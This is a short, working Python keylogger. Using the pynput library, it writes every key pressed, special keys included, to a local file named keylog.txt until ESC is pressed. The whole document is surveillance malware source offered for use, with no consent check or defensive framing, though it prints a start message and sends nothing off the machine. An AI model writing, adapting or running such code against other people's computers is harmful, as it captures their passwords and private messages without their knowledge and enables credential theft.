from pynput.keyboard import Key, Listener

log_file = "keylog.txt"

def on_press(key):
    """
    Function to handle key press events.
    The key pressed is written to the log file.
    """
    with open(log_file, "a") as f:
        try:
            f.write(key.char)
        except AttributeError:
            f.write(f" [{key}] ")

def on_release(key):
    """
    Function to handle key release events.
    Stops the listener if the escape key is pressed.
    """
    if key == Key.esc:
        return False  

def start_keylogger():
    """
    Start the keylogger by listening for key press and release events.
    """
    with Listener(on_press=on_press, on_release=on_release) as listener:
        listener.join()

if __name__ == "__main__":
    print("Starting keylogger... Press ESC to stop.")
    start_keylogger()
